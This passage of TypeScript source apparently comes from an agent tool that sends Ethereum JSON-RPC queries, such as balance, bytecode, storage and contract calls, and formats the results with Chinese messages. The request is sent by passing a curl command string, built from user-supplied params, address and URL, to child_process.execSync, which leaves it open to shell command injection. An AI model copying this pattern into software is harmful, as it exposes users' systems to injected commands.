          if (!address) return `[错误] eth_getBalance 需要 address 参数`;
          rpcParams = [address, block];
          extraInfo = `查询地址 ${address} 的余额`;
          break;
        case "eth_getCode":
          if (!address) return `[错误] eth_getCode 需要 address 参数`;
          rpcParams = [address, block];
          extraInfo = `查询合约 ${address} 的字节码`;
          break;
        case "eth_getStorageAt":
          if (!address) return `[错误] eth_getStorageAt 需要 address 参数`;
          // 存储槽从 params 解析
          let slot = "0x0";
          if (params) {
            try {
              const parsed = JSON.parse(params);
              slot = parsed.slot || parsed.position || parsed[0] || "0x0";
              if (Array.isArray(parsed)) slot = parsed[0] || "0x0";
            } catch {
              slot = params;
            }
          }
          rpcParams = [address, slot, block];
          extraInfo = `查询地址 ${address} 存储槽 ${slot}`;
          break;
        case "eth_call":
          if (!address) return `[错误] eth_call 需要 address 参数`;
          // call data 从 params 解析
          let callData = "0x";
          if (params) {
            try {
              const parsed = JSON.parse(params);
              callData = typeof parsed === "string" ? parsed : (parsed.data || parsed.input || "0x");
            } catch {
              callData = params;
            }
          }
          rpcParams = [{ to: address, data: callData }, block];
          extraInfo = `调用合约 ${address}，call data: ${callData}`;
          break;
        case "eth_getTransactionByHash":
        case "eth_getTransactionReceipt":
          if (!address) return `[错误] ${method} 需要 address 参数（作为 tx hash）`;
          rpcParams = [address];
          extraInfo = `查询交易 ${address}`;
          break;
        case "eth_blockNumber":
          rpcParams = [];
          extraInfo = `查询最新区块号`;
          break;
        case "eth_getBlockByNumber":
          rpcParams = [block, false];
          extraInfo = `查询区块 ${block}`;
          break;
        default:
          // 自定义方法：从 params 解析
          if (params) {
            try {
              rpcParams = JSON.parse(params);
              if (!Array.isArray(rpcParams)) rpcParams = [rpcParams];
            } catch {
              rpcParams = [params];
            }
          } else if (address) {
            rpcParams = [address, block];
          }
          extraInfo = `自定义方法 ${method}`;
      }

      // 构造 JSON-RPC 请求
      const payload = JSON.stringify({
        jsonrpc: "2.0",
        method: method,
        params: rpcParams,
        id: 1,
      });

      try {
        const result = child_process.execSync(
          `curl -s -X POST -H "Content-Type: application/json" --data '${payload}' ${url}`,
          { timeout: 15000, encoding: "utf-8" }
        );

        let parsed: any;
        try {
          parsed = JSON.parse(result);
        } catch {
          return `[RPC 查询失败] 响应非 JSON 格式\n原始响应:\n${result.slice(0, 500)}`;
        }

        let out = `[RPC 查询] ${method}\n链: ${chain} | RPC: ${url}\n${extraInfo}\n${"=".repeat(60)}\n`;

        if (parsed.error) {
          out += `[RPC 错误] code: ${parsed.error.code}\nmessage: ${parsed.error.message}`;
          return out;
        }

        const res = parsed.result;

        // 格式化特定方法的输出
        if (method === "eth_getBalance") {
          const balance = typeof res === "string" ? parseInt(res, 16) : 0;
          out += `余额: ${res} wei\n       ${balance / 1e18} ETH`;
        } else if (method === "eth_getCode") {
          const codeLen = res && res !== "0x" ? (res.slice(2).length / 2) : 0;
          out += `字节码长度: ${codeLen} 字节\n${res && res !== "0x" ? res.slice(0, 200) + (res.length > 200 ? "..." : "") : "(EOA 账户，无合约代码)"}`;
        } else if (method === "eth_getStorageAt") {
          out += `存储值: ${res}`;
        } else if (method === "eth_blockNumber") {
          const blockNum = typeof res === "string" ? parseInt(res, 16) : res;
          out += `最新区块号: ${blockNum}`;
        } else {
          // 默认输出 JSON
          const jsonStr = JSON.stringify(res, null, 2);
          out += jsonStr.length > 2000 ? jsonStr.slice(0, 2000) + "\n... (已截断)" : jsonStr;
        }

        return out;
      } catch (err: any) {
        return `[RPC 查询失败] ${err.message}\nURL: ${url}\nPayload: ${payload}`;
      }
    },
  });

  return registry;
}
